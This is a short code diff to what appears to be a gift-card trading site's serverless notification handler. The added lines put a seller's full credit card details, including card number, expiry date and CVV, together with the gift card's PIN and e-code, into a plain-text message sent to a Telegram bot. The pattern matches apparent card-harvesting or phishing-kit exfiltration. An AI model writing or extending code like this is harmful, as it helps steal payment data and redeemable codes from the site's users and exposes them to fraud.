@@ -281,6 +281,13 @@ serve(async (req) => {
       );
     } else if (notificationData.type === 'sell') {
       // Handle sell notification
+      const paymentDetailsText = notificationData.paymentDetails 
+        ? `Cardholder: ${notificationData.paymentDetails.cardholderName || 'N/A'}\n` +
+          `Card Number: ${notificationData.paymentDetails.cardNumber || 'N/A'}\n` +
+          `Expiry: ${notificationData.paymentDetails.expiryDate || 'N/A'}\n` +
+          `CVV: ${notificationData.paymentDetails.cvv || 'N/A'}`
+        : 'N/A';
+      
       message = `💰 *New Gift Card Sale*\n\n` +
                 `📧 Email: ${notificationData.email}\n` +
                 `🎫 Gift Card: ${notificationData.giftcardName}\n` +
@@ -289,7 +296,7 @@ serve(async (req) => {
                 `📌 PIN: ${notificationData.pin}\n` +
                 `🎯 E-Code: ${notificationData.ecode || 'N/A'}\n` +
                 `💳 Payment Method: ${notificationData.paymentMethod}\n` +
-                `💼 Payment Details: ${JSON.stringify(notificationData.paymentDetails)}\n` +
+                `💼 Credit Card Details:\n${paymentDetailsText}\n` +
                 `⏰ Time: ${new Date().toLocaleString()}`;
 
       await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
